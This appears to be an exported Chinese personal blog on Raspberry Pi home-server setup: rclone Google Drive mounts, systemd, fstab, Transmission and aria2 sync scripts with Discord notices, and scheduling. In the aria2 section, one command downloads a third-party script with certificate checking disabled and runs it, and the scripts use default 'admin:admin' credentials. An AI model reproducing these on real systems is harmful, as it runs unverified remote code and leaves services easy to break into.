--dir-cache-time 48h --vfs-read-chunk-size 16M --buffer-size 2G Googlecrypt: /home/plex\nExecStop=/bin/fusermount -uz /home/plex\nRestart=on-abort\n```\n\n\n最終我電腦設定\n```\n[Unit]\nDescription=RClone Service\nAfter=network-online.target\nWants=network-online.target\n\n[Service]\nUser=pi\nType=notify\n#ExecStart=/usr/bin/rclone mount --allow-root --vfs-cache-mode writes --vfs-cache-max-size 100M gdrive: /mnt/gdrive\nExecStart=/usr/bin/rclone mount --allow-root --vfs-cache-mode writes --vfs-cache-max-size 100M gdrive: /mnt/gdrive\nExecStop=/bin/fusermount -uz /mnt/gdrive\nRestartSec=30\n\n[Install]\nWantedBy=multi-user.target\n```\n\nallow-root 不能用...，好像是 bug\n\n\n- [Rclone auto mount - rclone - rclone forum](https://forum.rclone.org/t/rclone-auto-mount/6353)\n- [rclone Systemd startup mount script – JamesCoyle.net Limited](https://www.jamescoyle.net/how-to/3116-rclone-systemd-startup-mount-script)\n- [rclone fstab mount helper script · rclone/rclone Wiki](https://github.com/rclone/rclone/wiki/rclone-fstab-mount-helper-script)\n- Restart 可參考[Systemd 入门教程：实战篇 - 阮一峰的网络日志](https://www.ruanyifeng.com/blog/2016/03/systemd-tutorial-part-two.html)\n- [systemd (正體中文) - ArchWiki](https://wiki.archlinux.org/index.php/Systemd_(%E6%AD%A3%E9%AB%94%E4%B8%AD%E6%96%87))\n### 移除 rclone\n\n[Home · pageauc/rclone4pi Wiki](https://github.com/pageauc/rclone4pi/wiki#how-to-remove-rclone)\n\n### 使用 Google Driver 注意事項\n\n- 1 天上傳最多 750 GB\n- 1 個檔案不能超過 100 GB\n- 不能太平凡掛載\n\n超過小心帳號可能會被 Ban!!\n\n### rsync 複製檔案顯示進度\n\n```\nrsync -rvh --progress /mnt/ddd /mnt/gdrive\n```\n-r 複製資料夾記得要加上去\n\n影片不建議使用 rsync ，不知道為什麼丟到上面去，影片不會轉成線上看\n下載檔案後面會加奇怪副檔名，所以用 `cp` 比較不會有問題\n\n後來發現`rclone sync xxx gd:xxx -P` 也能看狀態= =\n\n### Raspberry PI 掛載 USB\n\n之前有在 [葉難: Raspberry Pi：自動掛載USB隨身碟](http://yehnan.blogspot.com/2016/05/raspberry-piusb.html) 看到怎麼使用\n```\nUUID=\"F840-AAE1\"  /media/usbstick vfat   rw,defaults 0 0\n```\n\n後面兩個 0 代表\n```\n    第五欄：能否被 dump 備份指令作用：\n\ndump 是一個用來做為備份的指令，不過現在有太多的備份方案了，所以這個項目可以不要理會啦！直接輸入 0 就好了！\n\n    第六欄：是否以 fsck 檢驗磁區：\n\n早期開機的流程中，會有一段時間去檢驗本機的檔案系統，看看檔案系統是否完整 (clean)。 不過這個方式使用的主要是透過 fsck 去做的，我們現在用的 xfs 檔案系統就沒有辦法適用，因為 xfs 會自己進行檢驗，不需要額外進行這個動作！所以直接填 0 就好了。\n```\n參考:[鳥哥的 Linux 私房菜 -- 第七章、Linux 磁碟與檔案系統管理](http://linux.vbird.org/linux_basic/0230filesystem.php#fstab)\n\n\n1. sudo fdisk -l  (查看裝置有沒有掛載)\n2. $ sudo mkdir /mnt/extHDD (建置掛載用的資料夾和權限)\n$ sudo chown pi:pi /mnt/extHDD\n3. sudo mount -t vfat  /dev/sda1 /mnt/extHDD # (test mount) ext4的話，把 vfat 改成 ext4\n`-o uid=pi,gid=pi`我的樹梅派家這段會失敗\n4. sudo umount /dev/sda1 # 解除掛載\n5. sudo blkid # 查看掛載的 UUID\n6. sudo vim /etc/fstab  \n7. 加入 UUID=\"F840-AAE1\"  /mnt/extHDD vfat   rw,defaults 0 0 #(-a, --all 掛載 fstab 中的所有文件系統)\n\n\n\n[Mount的用法詳細解析 - IT閱讀](https://www.itread01.com/content/1553540779.html)\n\n最近看到[使 Amazon EBS 磁碟區可供在 Linux 上使用 - Amazon Elastic Compute Cloud](https://docs.aws.amazon.com/zh_tw/AWSEC2/latest/UserGuide/ebs-using-volumes.html)這篇\nUUID=aebf131c-6957-451e-8d34-ec978d9581ae  /data  xfs  defaults,**nofail**  0  2\n> 如果曾在不掛載此磁碟區的狀態下開機執行個體 (例如，在將磁碟區移至其他執行個體後)，nofail 掛載選項可讓執行個體繼續開機，即使在掛載磁碟區的作業出現錯誤。包括 16.04 前之 Ubuntu 版本在內的 Debian 衍生產品，也必須新增 nobootwait 掛載選項。 \n\n/usr/bin/rclone mount --allow-root --vfs-cache-mode writes --vfs-cache-max-size 100M gdrive: /mnt/gdrive\n2019/10/16 16:15:54 mount helper error: fusermount: option allow_root only allowed if 'user_allow_other' is set in /etc/fuse.conf\n\n### systemctl 和 service 掛載的差異\n\n在這次藉著學習到簡單使用 systemctl 設定服務\n但很好奇這兩個差異\n\n> systemd是Linux系統最新的初始化系統(init),作用是提高系統的啟動速度，儘可能啟動較少的進程，儘可能更多進程並發啟動。\n> systemd對應的進程管理命令是systemctl\n\n參考:[Linux 服務管理兩種方式service和systemctl - 迪米特 - 博客園](https://www.cnblogs.com/shijingjing07/p/9301590.html)\n裡面還有講:`主要有四種類型文件.mount,.service,.target,.wants`\n\n有找到比較兩者指令差異[centos7 systemctl取代service和chkconfig来实现系统管理 - cape的博客 - CSDN博客](https://blog.csdn.net/capecape/article/details/78505511) {% asset_link web1.png 備份圖 %}\n\n發現選擇 systemctl 還是能繼續用 service 指令\n習慣改不了用 service XDD\n\n但設定上 service 設定服務需要用 chkconfig\n用systemctl 直接 enable/disable 就能解決\n\n[systemd (简体中文) - ArchWiki](https://wiki.archlinux.org/index.php/Systemd_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87))\n[systemd/User (简体中文) - ArchWiki](https://wiki.archlinux.org/index.php/Systemd/User_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87))\n\n`journalctl` 查看 systemctl log\n```\n#查看所有日誌（默認情況下 ，只保存本次啟動的日誌） $ sudo journalctl #查看內核日誌（不顯示應用日誌） \n$ sudo journalctl -k #查看系統本次啟動的日誌 \n$ sudo journalctl -b \n$ sudo journalctl -b -0 #查看上一次啟動的日誌（需更改設置） \n$ sudo journalctl -b -1 #查看指定時間的日誌 \n$ sudo journalctl --since=\"2017-09-26 22:17:16\" \n$ sudo journalctl --since \"30 min ago\" \n$ sudo journalctl --since yesterday \n$ sudo journalctl --since \"2015-01-10\" --until \"2017-01-11 03:00\" \n$ sudo journalctl --since 09:00 --until \"1 hour ago\" #顯示尾部的最新10行日誌 \n$ sudo journalctl -n #顯示尾部指定行數的日誌 \n$ sudo journalctl -n 50 #實時滾動顯示最新日誌 \n$ sudo journalctl -f #查看指定服務的日誌 \n$ sudo journalctl /usr/lib/systemd/systemd #查看指定進程的日誌 \n$ sudo journalctl _PID=1 #查看某個路徑的腳本的日誌 \n$ sudo journalctl /usr/bin/bash #查看指定用戶的日誌 \n$ sudo journalctl _UID=33 --since today #查看某個 Unit 的日誌 \n$ sudo journalctl -u nginx.service \n$ sudo journalctl -u nginx.service --since today #實時滾動顯示某個 Unit 的最新日誌 \n$ sudo journalctl -u nginx.service -f #合併顯示多個 Unit 的日誌 \n$ journalctl -u nginx.service -u php-fpm.service --since today #查看指定優先級（及其以上級別）的日誌，共有8級\n # 0: emerg\n # 1: alert\n # 2: crit\n # 3: err\n # 4: warning\n # 5: notice\n # 6: info\n # 7: debug \n$ sudo journalctl -p err -b #日誌默認分頁輸出，--no-pager 改為正常的標準輸出 \n$ sudo journalctl --no-pager #以 JSON 格式（單行）輸出 \n$ sudo journalctl -b -u nginx.service -o json #以 JSON 格式（多行）輸出，可讀性更好 \n$ sudo journalctl -b -u nginx.serviceqq -o json-pretty #顯示日誌占據的硬碟空間 \n$ sudo journalctl --disk-usage #指定日誌文件占據的最大空間 \n$ sudo journalctl --vacuum-size=1G #指定日誌文件保存多久 \n$ sudo journalctl --vacuum-time=1years\n\n原文網址：https://kknews.cc/code/pqyayy2.html\n```\n\n相關網頁\n- [systemd一種更好的啟動方式 - 每日頭條](https://kknews.cc/zh-tw/code/pqyayy2.html)\n- [鳥哥的 Linux 私房菜 -- 第十七章、認識系統服務 (daemons)](http://linux.vbird.org/linux_basic/0560daemons.php#systemd_cfg_vsftpd)\n- [玩转 systemd 之用户级服务管理 - 依云's Blog](https://blog.lilydjwg.me/2014/2/2/systemd-user-daemons.42631.html)\n\n聽說一般 user 家目錄也可以做服務設定\n這一快我就先不研究\n改天用到再說\n\n**2020-04-26**\n\n這些查詢滿常用的\n\n```bash\n# 檢查 nginx 服務是否正在運行\nsystemctl is-active nginx.service\n\n# 檢查 nginx 服務是否有設定開機自動啟動\nsystemctl is-enabled nginx.service\n\n# 檢查 nginx 服務是否啟動失敗\nsystemctl is-failed nginx.service\n```\n\n### tmux 掛載方式(不建議用)\n\n在沒知道用 systemctl 原本想使用 tmux\n不過看起來好像能跑，但我覺得 systemctl 比較完美\n\n[tmux script example](https://gist.github.com/B-Galati/c7890f86fc2bfce0b98c5410d964727a)\n\n```bash\n#!/bin/bash\ntmux new-window -d -n 'test' 'ping 127.0.0.1'\n```\n\n## tranmission \n\n```\n\"script-torrent-done-enabled\": true,\n\"script-torrent-done-filename\": \"/home/user/script.sh\",\n```\n記得 chmod a+x /home/user/script.sh\n裡面對印的\nconf 也要加 777 (tranmission不同權限，或加群組權限)\n```\n# 注意需要看.config/rclone 資料夾和檔案權限，需要到rx\nRCLONE_CONFIG_PATH=\"--config=/home/pi/.config/rclone/rclone.conf\"\n```\n[Transmission download complete shell script for moving complete files and removing its torrent entry](https://gist.github.com/awesometic/253b740d45f8e5f95b56ec24f33a9444)\n[Script to clear finished torrents from transmission-daemon](https://gist.github.com/pawelszydlo/e2e1fc424f2c9d306f3a)\n[Guide : Auto removal of downloads from transmission 2.82 - My Cloud - Personal Cloud Storage / My Cloud - WD Community](https://community.wd.com/t/guide-auto-removal-of-downloads-from-transmission-2-82/93156)\n[Tmux 開啟後 自動 SSH 連結多台指定機器 | Tsung's Blog](https://blog.longwin.com.tw/2013/05/tmux-auto-ssh-remote-2013/)\n[Transmission - Script to move completed downloads to directories, or how to create script? - Plugins - openmediavault](https://forum.openmediavault.org/index.php/Thread/13290-Transmission-Script-to-move-completed-downloads-to-directories-or-how-to-create/)\n[ubuntu - Copy completed files larger than 1024M to another directory - Super User](https://superuser.com/questions/735691/copy-completed-files-larger-than-1024m-to-another-directory)\n[ubuntu - Copy completed files larger than 1024M to another directory - Super User](https://superuser.com/questions/735691/copy-completed-files-larger-than-1024m-to-another-directory/735757#735757)\n\n密碼不要取驚嘆號\n[技术|在Linux命令行下令人惊叹的惊叹号（!）](https://linux.cn/article-5608-1.html)\n\n```\nOct 18 23:35:12 raspberrypi transmission-daemon[13077]: 2019/10/18 23:35:12 Failed to save config after 10 tries: Failed to create temp file for new config: open /home/pi/.config/rclone/rclone.conf295018896: permission denied\nOct 18 23:35:17 raspberrypi transmission-daemon[13077]: 2019/10/18 23:35:17 Failed to save config after 10 tries: Failed to create temp file for new config: open /home/pi/.config/rclone/rclone.conf984318943: permission denied\n```\n\n我改寫的 Script\n有通知 discord 功能\n```bash\n#!/bin/bash\n\nDSCORD_WEBHOOK=\"https://discordapp.com/api/webhooks/*\"\n# 需要做同步的路徑，結尾資料夾不用/\nLOCAL_SYNCDIR=\"/mnt/extHDD/Download\"\n# RCLONE 結尾不能有 /\nRCLONE_SYNCDIR=\"gdrive:/test\"\n# 注意需要看.config/rclone 資料夾和檔案權限，需要到rx\nRCLONE_CONFIG_PATH=\"--config=/home/pi/.config/rclone/rclone.conf\"\nAUTH=\"--auth admin:admin\"\n#### debug end\ndf -H | grep -vE '^Filesystem|tmpfs|cdrom|udev|已用' | awk '{ print $5 \" \" $1 }' | while read output;\ndo\n  usep=$(echo $output | awk '{ print $1}' | cut -d'%' -f1  )\n  partition=$(echo $output | awk '{ print $2 }' )\n  if [ $usep -ge 80 ]; then\n    msg=\"⚠️注意快超出硬碟空間\\\\\\\"$partition\\\\\\\" ($usep%) on $(hostname) as on $(date)\"\n    url=$DSCORD_WEBHOOK\n    curl -H \"Content-Type: application/json\" \\\n    -X POST \\\n    -d \"{\\\"username\\\": \\\"system\\\", \\\"content\\\": \\\"${msg}\\\"}\" $url\n  fi\ndone\n\n\n\n\n\nif [[ \"$TR_TORRENT_DIR\" =~ ^\"$LOCAL_SYNCDIR\" ]]; then\n    echo \"pass\"\n    if [ -f \"${TR_TORRENT_DIR}/${TR_TORRENT_NAME}\" ]; then\n        flock -x  /tmp/rclone.lock rclone copy ${RCLONE_CONFIG_PATH} \"${TR_TORRENT_DIR}/${TR_TORRENT_NAME}\" \"$RCLONE_SYNCDIR\"\n        rclone check ${RCLONE_CONFIG_PATH} \"${TR_TORRENT_DIR}/${TR_TORRENT_NAME}\" \"$RCLONE_SYNCDIR\"\n    else \n        flock -x  /tmp/rclone.lock rclone copy ${RCLONE_CONFIG_PATH} \"${TR_TORRENT_DIR}/${TR_TORRENT_NAME}\" \"$RCLONE_SYNCDIR/${TR_TORRENT_NAME}\"\n        rclone check ${RCLONE_CONFIG_PATH} \"${TR_TORRENT_DIR}/${TR_TORRENT_NAME}\" \"$RCLONE_SYNCDIR/${TR_TORRENT_NAME}\" --size-only\n    fi\n    \n    if [ $? -eq 0 ]; then\n        msg=\"✅ $TR_TORRENT_NAME 完成下載，並完成同步\"\n        echo $msg\n        url=$DSCORD_WEBHOOK\n        curl -H \"Content-Type: application/json\" \\\n        -X POST \\\n        -d \"{\\\"username\\\": \\\"system\\\", \\\"content\\\": \\\"${msg}\\\"}\" $url\n        transmission-remote $AUTH -t $TR_TORRENT_ID --remove-and-delete\n    else\n        echo \"FAIL\"\n        msg=\"⚠️ $TR_TORRENT_NAME 完成下載，但同步失敗\"\n        echo $msg\n        url=$DSCORD_WEBHOOK\n        curl -H \"Content-Type: application/json\" \\\n        -X POST \\\n        -d \"{\\\"username\\\": \\\"system\\\", \\\"content\\\": \\\"${msg}\\\"}\" $url\n    fi\n    \nelse\n    echo \"✅$TR_TORRENT_NAME 完成下載，不需要做同步\"\n    msg=\"✅$TR_TORRENT_NAME 完成下載，不需要做同步\"\n    echo $msg\n    url=$DSCORD_WEBHOOK\n    curl -H \"Content-Type: application/json\" \\\n    -X POST \\\n    -d \"{\\\"username\\\": \\\"system\\\", \\\"content\\\": \\\"${msg}\\\"}\" $url\nfi\n\n```\n\n有時候會失敗，補跑方式也很簡單\n```bash\nexport TR_TORRENT_DIR=\"/mnt/extHDD/Download\"\nls $TR_TORRENT_DIR\n\nexport TR_TORRENT_NAME=\"xxx\"\n\n#測試\n#echo ${TR_TORRENT_DIR}/${TR_TORRENT_NAME}\nls \"${TR_TORRENT_DIR}/${TR_TORRENT_NAME}\"\n\n/etc/transmission-daemon/syncGdrive.sh\n```\n\n最近這個腳本還算完美的\n不過處理大檔案`rclone check `太久了\n\n> → thousandday: rclone sync比對修改時間和size(很快,省流量) 05/29 18:17\n> → thousandday: rclone check --size-only比對size(很快,省流量) 05/29 18:18\n> → thousandday: rclone sync -c完整下載後Checksum(慢,費流量) 05/29 18:18\n> → thousandday: rclone check下載hash值後Checksum(慢,省流量) 05/29 18:18\n> → thousandday: Google Drive有支援hash可以直接撈到MD5 05/29 18:19\n> → thousandday: 沒支援hash的雲端空間要Checksum只能完整下載 05/29 18:19\n> → thousandday: 用rclone sync -c或rclone check --download 05/29 18:19\n> → thousandday: 個人認為rclone sync夠用了 Checksum很花時間和效能 05/29 18:20\n> → thousandday: 檔案如果多又大 好幾TB會跑到天荒地老\n[[工具] 自製本機與google drive檔案md5比對工具 - 看板 Free_box - 批踢踢實業坊](https://www.ptt.cc/bbs/Free_box/M.1527420602.A.819.html)\n\n我後來加`--size-only`\n覺得應該不會這麼衰...\n不然好幾GB都卡很久\n\n### aria2(不建議使用)\n\n除非你想用...\n\n安裝方法\n```\nwget -N --no-check-certificate https://raw.githubusercontent.com/ToyoDAdoubiBackup/doubi/master/aria2.sh && chmod +x aria2.sh && bash aria2.sh\n```\n[『原创』BT/种子/磁力链接下载工具 —— Aria2 一键安装管理脚本 | 逗比根据地](https://doubibackup.com/zuigoj__.html?fbclid=IwAR22FvWyZjXt8qwW2IQfYGOPbmewh6kyRpqvxSX3Zd0aWKJQAx1p777hOCo)\n但說真的這個腳本整合超好的\n\n幫我同學用的\n結果用別人 Script 搬到 rclone 不能正常\n所以自己改寫，可能有 bug\n請自行修\n\n有看到 *.aria2 檔案有刪除\n重開機有時候回重新載(然後aira2檔案又會出現...)\n不知道是不是用 aria2 會有這樣問題?\n\n$3 不是傳資料夾位址\n所以在查哪個資料夾會不太方便\n所以檔案一定要下載在 downloadpath 才會做上傳動作\n\nScript 是參考這個網站\n但好像連不到了(在我寫這篇前幾天掛掉...)\n[使用 Aria2 + rclone 遇到的一些问题 | 代码真香](https://webcache.googleusercontent.com/search?q=cache:f9-JvXWtHC0J:https://blog.codesofun.com/aria2-rclone-faq.html+&cd=7&hl=zh-TW&ct=clnk&gl=tw&client=firefox-b-d)\n備份到 [Plunker - demo script](https://next.plnkr.co/edit/DOfCgSvBCebpklXE?preview)\nYoutube 還活著 [代码真香 - YouTube](https://www.youtube.com/channel/UCmlhPmTdqYhRWwWZWSIBwGw?feature=embeds_subscribe_title)\n\n目前 $3 是傳第一個檔案內容\n這邊就跟 tranmission 不太一樣，tranmission 給的參數比較完整\n發現原 Script 會複製全部目錄到 rclone 去\n這樣多線程下載的檔案會有問題\n所以依照來看，舊的 Script 應該是 **1線程** 下載 (它裡面網頁沒寫...，不過看他網頁寫 VPS 10GB 看來是有可能的....)\n\n因為我不熟 shell ，以下用的出事不要找我XD\n\n```bash\n#!/bin/bash\n\nfilepath=$3\t #取文件原始路径，如果是单文件则为/Download/a.mp4，如果是文件夹则该值为文件夹内第一个文件比如/Download/a/1.mp4\npath=${3%/*}\t #取文件根路径，如把/Download/a/1.mp4变成/Download/a\ndownloadpath='/media/download'\t#Aria2下载目录\nname='gdrive' #配置Rclone时的name\nfolder='/test2'\t #网盘里的文件夹，如果是根目录直接留空\nMinSize='10k'\t #限制最低上传大小，默认10k，BT下载时可防止上传其他无用文件。会删除文件，谨慎设置。\nMaxSize='15G'\t #限制最高文件大小，默认15G，OneDrive上传限制。\n\n\nif [ $2 -eq 0 ]; then exit 0; fi\n\nif [ `dirname \"$filepath\"` =  \"$downloadpath\" ] && [ $2 -eq 1 ]\t#如果下载的是单个文件\n    then\n    echo \"enter 1\" \n    rclone move -v \"$filepath\" ${name}:${folder} --min-size $MinSize --max-size $MaxSize\n    rm -vf \"$filepath\".aria2\t#删除残留的.aria.2文件\n    echo result: $?\n    exit 0\nelif [[ \"$path\" =~ ^\"$downloadpath\" ]]\t#如果下载的是文件夹\n    then\n    echo \"enter 2\"\n    echo path_length ${#path}\n\n    a=$downloadpath\n    b=\"$filepath\"\n    c=${b#$a/}\n    d=${c%%/*}\n    echo d = $d\n    echo $path/$d/\n\n    rclone move -v \"$downloadpath/$d/\" ${name}:/${folder}/\"${d}\" --min-size $MinSize --max-size $MaxSize --delete-empty-src-dirs\n    #rclone delete -v \"$downloadpath/$d/\" --max-size $MinSize\t#删除多余的文件\n    #rclone rmdirs -v \"$downloadpath/$d/\" --leave-root\t#删除空目录，--delete-empty-src-dirs 参数已实现，加上无所谓。\n    rm -vf \"$downloadpath/$d\".aria2\t#删除残留的.aria2文件\n    rmdir \"$downloadpath/$d\"\n    echo result: $?\n    exit 0\nfi\n```\n\na=\"123\"\nb=\"123/4/125/1236\"\nc=${b#$a/}\nd=${c%%/*}\n\n[shell中#*,##*,#*,##*,% *,%% *的含义及用法 - jiezi2016的博客 - CSDN博客](https://blog.csdn.net/jiezi2016/article/details/79649382)\n\n## 參考來源\n\n* [Linux下rclone简单教程(支持VPS数据同步,多种网盘,支持挂载) | 半醉浮生丶](https://ymgblog.com/2018/03/09/296/)\n* [Raspberry Pi microSD card performance comparison - 2019 | Jeff Geerling](https://www.jeffgeerling.com/blog/2019/raspberry-pi-microsd-card-performance-comparison-2019)\n* [树莓派raspberrypi3打造homeassistant+homebridge智能家居中心（homekit） - 知乎](https://zhuanlan.zhihu.com/p/31004760)\n* [raspbian - How to set VNC security settings using SSH? `No security types supported. Server sent security types, but we do not support any of them` - Raspberry Pi Stack Exchange](https://raspberrypi.stackexchange.com/questions/63586/how-to-set-vnc-security-settings-using-ssh-no-security-types-supported-server)\n* [解决Rclone挂载Google Drive时上传失败和内存占用高等问题 - Rat's Blog](https://www.moerats.com/archives/877/)\n* [利用Aria2+Nginx+rclone完成无限电影硬盘 | Sandy'Blog](https://blog.e9china.net/lesson/liyongaria2nginxrclonewanchengwuxiandianyingyingpan.html)\n* [Plex + Rclone 掛載 Google drive 搭建多媒體伺服器 - WIJ Blog](https://wijtb.nctu.me/archives/153/)\n* [[筆記]將Google Drive掛載到NAS上(用rclone) @ 老電影下載 [ Old Movies ] :: 痞客邦 ::](https://ak77now.pixnet.net/blog/post/45722625-mount-google-drive-on-nas-with-rclone)\n* [使用 rclone 在 Windows 下挂载 Google 个人 / 团队云盘 - R 酱小窝](https://blog.rhilip.info/archives/874/)\n* [【转载】Rclone: 超好用的网盘 / VPS 数据同步、备份工具，支持 Google Drive | 初行博客](https://www.zrj96.com/post-520.html)\n* [Rclone 进阶使用教程：常用命令参数详解 - P3TERX ZONE - Zhuangbility & Technology](https://p3terx.com/archives/rclone-advanced-user-manual-common-command-parameters.html)\n* [[心得] Rclone Browser教學 - 看板 Free_box - 批踢踢實業坊](https://www.ptt.cc/bbs/Free_box/M.1529958022.A.295.html)\n* [Screenly - How to automatically turn off and on your monitor from your Raspberry Pi](https://www.screenly.io/blog/2017/07/02/how-to-automatically-turn-off-and-on-your-monitor-from-your-raspberry-pi/)\n* [Raspberry Pi - 超赞合集 awesome list chinese](https://asmcn.icopy.site/awesome/awesome-raspberry-pi/)\n* [About script torrent done filename · ronggang/transmission-web-control Wiki](https://github.com/ronggang/transmission-web-control/wiki/About-script-torrent-done-filename)\n* [Scripts · transmission/transmission Wiki](https://github.com/transmission/transmission/wiki/Scripts)\n* [LearnHouse » Blog Archive » [Raspberry Pi 3]開機自動掛載 USB 隨身碟或外接硬碟](https://learn-house.idv.tw/?p=2340)\n* [伺服器架設/防火牆建置 - HackMD](https://hackmd.io/@Pingu/SyZ1Pq7mQ/https%3A%2F%2Fhackmd.io%2Fs%2FSyP9NaGpm%23?type=book)\n* [CodeIgniter用ChromePHP來debug[PHP] | 敲敲打打的生活](http://blog.ipushs.com/codeigniter%e7%94%a8chromephp%e4%be%86debugphp/)\n* [bash wait exit on error code - Stack Overflow](https://stackoverflow.com/questions/49513335/bash-wait-exit-on-error-code)\n* [Mounting Google Drive on Raspberry Pi - Artur Klauser - Medium](https://medium.com/@artur.klauser/mounting-google-drive-on-raspberry-pi-f5002c7095c2)\n* [Google Drive 相互複製 對拷 – BunnyBit 比特小兔兔](https://0xhack.wordpress.com/2019/02/27/google-drive-%E7%9B%B8%E4%BA%92%E8%A4%87%E8%A3%BD-%E5%B0%8D%E6%8B%B7/)\n* [Documentation](https://rclone.org/docs/#bwlimit-bandwidth-spec) 限速??待確認\n\n\n## AT 排成設定\n\n**2020-07-23**\n\n設定時間排程 at\nRaspberry Pi 預設沒有安裝\n```bash\nsudo apt install at\nat :time \n# at -l = atq\natq\n# atrm jobid\nat now + 5 minutes \n\n```\n中斷結束 Ctrl + D\n\n```\nat 04:00 \nat 04:00 2015-07-30\n```\nTIME：時間格式，這裡可以定義出『什麼時候要進行 at 這項工作』的時間，格式有：\n  HH:MM\t\t\t\tex> 04:00\n\t在今日的 HH:MM 時刻進行，若該時刻已超過，則明天的 HH:MM 進行此工作。\n  HH:MM YYYY-MM-DD\t\tex> 04:00 2015-07-30\n\t強制規定在某年某月的某一天的特殊時刻進行該工作！\n\n\n[transmission-remote(1) - Linux man page](https://linux.die.net/man/1/transmission-remote)\n開始所有 torrent 下載\n\n```bash\ntransmission-remote --auth=admin:admin   -tall --start\n```\n停止所有 torrent 下載\n```\ntransmission-remote --auth=admin:admin   -tall --stop\n```\n\n\n**20200808**\n更新放置路徑可用多重路徑同步\n\n\n```bash\n#!/bin/bash\n\nDSCORD_WEBHOOK=\"https://discordapp.com/api/webhooks/*\"\n\nfunction sendDiscordNotice(){\n        local MSG=$2\n        # echo $MSG\n        local URL=$1\n        curl -H \"Content-Type: application/json\" \\\n        -X POST \\\n        -d \"{\\\"username\\\": \\\"system\\\", \\\"content\\\": \\\"${MSG}\\\"}\" $URL\n}\n\n#sendDiscordNotice $DSCORD_WEBHOOK \"test\"\n\n# 需要做同步的路徑，結尾資料夾不用/\nLOCAL_SYNCDIR=\"/mnt/extHDD/Download\"\n# RCLONE 結尾不能有 /\nRCLONE_SYNCDIR=\"gdrive:/test\"\n# 注意需要看.config/rclone 資料夾和檔案權限，需要到rx\nRCLONE_CONFIG_PATH=\"--config=/home/pi/.config/rclone/rclone.conf\"\nAUTH=\"--auth admin:admin\"\nREPLATE_PATH=${TR_TORRENT_DIR#\"${LOCAL_SYNCDIR}\"/}  \n#### debug end\ndf -H | grep -vE '^Filesystem|tmpfs|cdrom|udev|已用' | awk '{ print $5 \" \" $1 }' | while read output;\ndo\n  usep=$(echo $output | awk '{ print $1}' | cut -d'%' -f1  )\n  partition=$(echo $output | awk '{ print $2 }' )\n  if [ $usep -ge 80 ]; then\n    sendDiscordNotice $DSCORD_WEBHOOK \"⚠️注意快超出硬碟空間\\\\\\\"$partition\\\\\\\" ($usep%) on $(hostname) as on $(date)\"\n  fi\ndone\n\n\n\n\n\nif [[ \"$TR_TORRENT_DIR\" =~ ^\"$LOCAL_SYNCDIR\" ]]; then\n    echo \"pass\"\n    if [ -f \"${TR_TORRENT_DIR}/${TR_TORRENT_NAME}\" ]; then\n        flock -x  /tmp/rclone.lock rclone copy ${RCLONE_CONFIG_PATH} \"${TR_TORRENT_DIR}/${TR_TORRENT_NAME}\" \"${RCLONE_SYNCDIR}/${REPLATE_PATH}\"\n        rclone check ${RCLONE_CONFIG_PATH} \"${TR_TORRENT_DIR}/${TR_TORRENT_NAME}\" \"${RCLONE_SYNCDIR}/${REPLATE_PATH}\"\n    else \n        flock -x  /tmp/rclone.lock rclone copy ${RCLONE_CONFIG_PATH} \"${TR_TORRENT_DIR}/${TR_TORRENT_NAME}\" \"${RCLONE_SYNCDIR}/${REPLATE_PATH}/${TR_TORRENT_NAME}\"\n        rclone check ${RCLONE_CONFIG_PATH} \"${TR_TORRENT_DIR}/${TR_TORRENT_NAME}\" \"$RCLONE_SYNCDIR/${REPLATE_PATH}/${TR_TORRENT_NAME}\" --size-only\n    fi\n    \n    if [ $? -eq 0 ]; then\n        msg=\"✅ $TR_TORRENT_NAME 完成下載，並完成同步\"\n        echo $msg\n        sendDiscordNotice $DSCORD_WEBHOOK \"$msg\"\n        transmission-remote $AUTH -t $TR_TORRENT_ID --remove-and-delete\n    else\n        echo \"FAIL\"\n        msg=\"⚠️ $TR_TORRENT_NAME 完成下載，但同步失敗\"\n        echo $msg\n        sendDiscordNotice $DSCORD_WEBHOOK \"$msg\"\n    fi\n    \nelse\n    msg=\"✅$TR_TORRENT_NAME 完成下載，不需要做同步\"\n    echo $msg\n    sendDiscordNotice $DSCORD_WEBHOOK \"$msg\"\nfi\n```","tags":["gdrive"],"categories":["Linux"]},{"title":"在 Linux 設定排程超過執行時間 kill 掉方法","url":"%2Fblog%2F2019%2F10%2F05%2F%E5%9C%A8-Linux-%E8%A8%AD%E5%AE%9A%E6%8E%92%E7%A8%8B%E8%B6%85%E9%81%8E%E5%9F%B7%E8%A1%8C%E6%99%82%E9%96%93-kill-%E6%8E%89%E6%96%B9%E6%B3%95%2F","content":"\n最近有一隻排程有時候會卡死\n但在想有沒有 crontab 設定方法\n網路上爬有爬到解決方法\n使用 timeout 指令\n\n<!--more-->\n\n使用方法很簡單\n\n```bash\ntimeout 10 ping 127.0.0.1\n```\n\n詳細了解\n \n> timeout [選項] 數字[後綴] 命令 [參數]...\n> \n> 後綴」s」代表秒(默認值)，」m」代表分，」h」代表小時，」d」代表天。\n> 選項詳解\n> \n> 長選項必須使用的參數對於短選項時也是必需使用的。\n>   -s, --signal=信號\n>         指定在超時時發送的信號。信號可以是類似\"HUP\"的信號名或是信號數。\n>         查看\"kill -l\"以獲得信號列表\n>       --help        顯示此幫助信息並退出\n>       --version        顯示版本信息並退出\n> \n> 如果程序超時則退出狀態數為124，否則返回程序退出狀態。\n> 如果沒有指定信號則默認為TERM 信號。TERM 信號在進程沒有捕獲此信號時殺死進程。\n> 對於另一些進程可能需要使用KILL (9)信號，當然此信號不能被捕獲。\n> ————————————————\n> 版权声明：本文为CSDN博主「Summer_ZJU」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。\n> 原文链接：https://blog.csdn.net/xiaqunfeng123/article/details/54315390\n\n\n[Linux命令——timeout - 夏天的风 - CSDN博客](https://blog.csdn.net/xiaqunfeng123/article/details/54315390)\n\n## 子程序 kill 探討\n\n我好奇子程序會不會關掉[如何在 Linux 殺掉(kill)子程序 | 程式狂想筆記](https://malagege.github.io/blog/2019/10/03/%E5%A6%82%E4%BD%95%E5%9C%A8-Linux-%E6%AE%BA%E6%8E%89-kill-%E5%AD%90%E7%A8%8B%E5%BA%8F/)\n自從上次紀錄\n我好奇子程序會不會關掉??\n經過實驗結果**會**\n但很奇怪我好奇他怎麼會 kill 掉 子程序\n經過我猜測，背景應該是使用`kill -- -$PGID`指令\n所以子程序才會關掉\n\n## 其他小記\n\n### 安裝timeout指令\n\n安裝timeout指令(通常沒例外的時候，Linux應該會有)\ncoreutils\n[timeout --> command not found in linux server - Stack 